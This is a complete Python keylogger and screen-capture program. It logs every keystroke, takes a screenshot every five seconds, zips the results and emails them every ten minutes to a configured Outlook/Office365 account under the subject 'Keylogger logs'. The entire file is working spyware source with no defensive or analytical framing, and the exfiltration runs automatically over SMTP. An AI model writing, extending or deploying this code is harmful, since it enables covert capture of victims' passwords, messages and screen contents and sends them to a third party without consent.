import shutil
import smtplib  # send email using SMTP
import time
from datetime import datetime
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pathlib import Path
from threading import Thread, Timer
from typing import Literal
from zipfile import ZIP_DEFLATED, ZipFile

import keyboard
from keyboard import KeyboardEvent
from mss import mss

# If you decide to send keystroke logs via email,
# make sure to configure an email account—such as
# one from Outlook or another compatible provider—and
# ensure that access for third-party applications using
# email and password authentication is enabled.

# =================================
PIC_INTERVAL = 5  # seconds
PIC_DEST = Path("./pics").resolve()
PIC_DEST_SENT = PIC_DEST / "sent"
PIC_DEST_ZIP = PIC_DEST / "zip"
# =================================
REPORT_DEST = Path("./reports").resolve()
REPORT_DEST_SENT = REPORT_DEST / "sent"
REPORT_DEST_ZIP = REPORT_DEST / "zip"
REPORT_INTERVAL = 60  # seconds
# =================================
EMAIL_SEND_INTERVAL = 600  # 10 minutes
EMAIL_ADDRESS = "user@example.com"
EMAIL_PASSWORD = "password"


def clean_dir(dir: Path):
    for file in dir.iterdir():
        if file.is_file():
            file.unlink(missing_ok=True)


def clean_dirs(dirs: list[Path]):
    for dir in dirs:
        clean_dir(dir)


def create_dirs(files: tuple[Path, ...] | None = None):
    if not files:
        files = (PIC_DEST_SENT, PIC_DEST_ZIP, REPORT_DEST_SENT, REPORT_DEST_ZIP)
    for p in files:
        p.mkdir(exist_ok=True, parents=True)


def prepare_mail(message: str, attachments: list[Path]) -> str:
    """Constructs a MIMEMultipart email with text, HTML, and attachments."""
    msg = MIMEMultipart("mixed")  # Use "mixed" to support attachments
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "Keylogger logs"

    msg_alt = MIMEMultipart("alternative")
    text_part = MIMEText(message, "plain")
    html_part = MIMEText(f"<p>{message}</p>", "html")
    msg_alt.attach(text_part)
    msg_alt.attach(html_part)

    msg.attach(msg_alt)

    for file_path in attachments:
        with open(file_path, "rb") as f:
            file_data = f.read()
            part = MIMEApplication(file_data, Name=file_path.name)
            part["Content-Disposition"] = f'attachment; filename="{file_path.name}"'
            msg.attach(part)
    # after making the mail, convert back as string message
    return msg.as_string()


def sendmail(
    email: str,
    password: str,
    message: str,
    attachments: list[Path] = [],
    verbose: bool = True,
):
    # manages a connection to an SMTP server
    # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
    server = smtplib.SMTP(host="smtp.office365.com", port=587)
    # connect to the SMTP server as TLS mode ( for security )
    server.starttls()
    # login to the email account
    server.login(email, password)
    # send the actual message after preparation
    server.sendmail(email, email, prepare_mail(message, attachments))
    # terminates the session
    server.quit()
    if verbose:
        print(
            f"{datetime.now()} - Sent an email to {email}"
            f"with attachments: {[a.name for a in attachments]}"
        )


def compress(
    files: list[Path], filename: Path | str, zip_dest: Path, compress_level: int = 9
) -> Path:
    zip_path = zip_dest / filename
    with ZipFile(zip_path, "w", ZIP_DEFLATED, compresslevel=compress_level) as zipf:
        for file in files:
            if file.is_file():
                zipf.write(file, arcname=file.name)
    return zip_path


def compress_files(
    src: Path,
    sent_dest: Path,
    zip_dest: Path,
    type: Literal["img", "report"],
    ext: Literal[".png", ".txt"],
) -> Path:
    files = [
        file for file in src.iterdir() if file.is_file() and file.suffix.lower() == ext
    ]
    filename = f"{type}-zip-{datetime.now().strftime('%Y-%m-%d-%H%M%S')}.zip"
    zip = compress(files, filename, zip_dest)
    for file in files:
        shutil.move(file, sent_dest / file.name)
    return zip


def start_email(interval: int, email: str, password: str):
    print(
        f"[*] {datetime.now()} - email thread started, waiting {interval}s between sends"
    )
    while True:
        try:
            time.sleep(interval)
            img_zip = compress_files(
                PIC_DEST, PIC_DEST_SENT, PIC_DEST_ZIP, "img", ".png"
            )
            report_zip = compress_files(
                REPORT_DEST, REPORT_DEST_SENT, REPORT_DEST_ZIP, "report", ".txt"
            )
            sendmail(email, password, "LOG", [img_zip, report_zip])
        except Exception as e:
            print(f"[-] {datetime.now()} - error trying to send email: {e}")


class Keylogger:
    def __init__(
        self,
        dest_dir: Path,
        interval: int = 60,
    ):
        self.dest = dest_dir
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event: KeyboardEvent):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if name:
            if len(name) > 1:
                # not a character, special key (e.g ctrl, alt, etc.)
                # uppercase with []
                if name == "space":
                    # " " instead of "space"
                    name = " "
                elif name == "enter":
                    # add a new line whenever an ENTER is pressed
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # replace spaces with underscores
                    name = f"[{name.replace(" ", "_").upper()}]"
            # finally, add the key name to our global `self.log` variable
            self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        format = "%Y-%m-%d-%H%M%S"
        start_dt_str = self.start_dt.strftime(format)
        end_dt_str = self.end_dt.strftime(format)
        self.filename = Path(f"keylog-{start_dt_str}_{end_dt_str}.txt")

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(self.dest / self.filename, "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            self.report_to_file()
            # if you don't want to print in the console, comment below line
            # print(f"[+] [{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"[*] {datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


class ScreenCapture:
    def __init__(self, dest: Path, pic_interval: int = 5) -> None:
        self.dest = dest
        self.interval = pic_interval

    def take_pic(self, pic_name: Path):
        with mss() as sct:
            sct.shot(output=str(self.dest / pic_name))

    @staticmethod
    def get_pic_name(pic_date: datetime):
        format = "%Y-%m-%d-%H%M%S"
        date = pic_date.strftime(format)
        return Path(f"pic-{date}.png")

    def report(self):
        date = datetime.now()
        name = ScreenCapture.get_pic_name(date)
        self.take_pic(name)
        print(f"[+] Captured {name}")

    def start(self):
        self.report()
        print(f"[*] {datetime.now()} - Started ScreenCapture")
        try:
            while True:
                time.sleep(self.interval)
                self.report()
        except KeyboardInterrupt:
            print("[-] ScreenCapture finished.")


if __name__ == "__main__":
    create_dirs()

    keylogger = Keylogger(REPORT_DEST, interval=REPORT_INTERVAL)
    sc = ScreenCapture(PIC_DEST, PIC_INTERVAL)

    keylogger_thread = Thread(target=keylogger.start, name="KeyloggerThread")
    screen_thread = Thread(target=sc.start, name="ScreenCaptureThread")
    email_thread = Thread(
        target=start_email,
        name="SendEmailThread",
        args=[EMAIL_SEND_INTERVAL, EMAIL_ADDRESS, EMAIL_PASSWORD],
    )

    keylogger_thread.start()
    screen_thread.start()
    email_thread.start()

    keylogger_thread.join()
    screen_thread.join()
    email_thread.join()
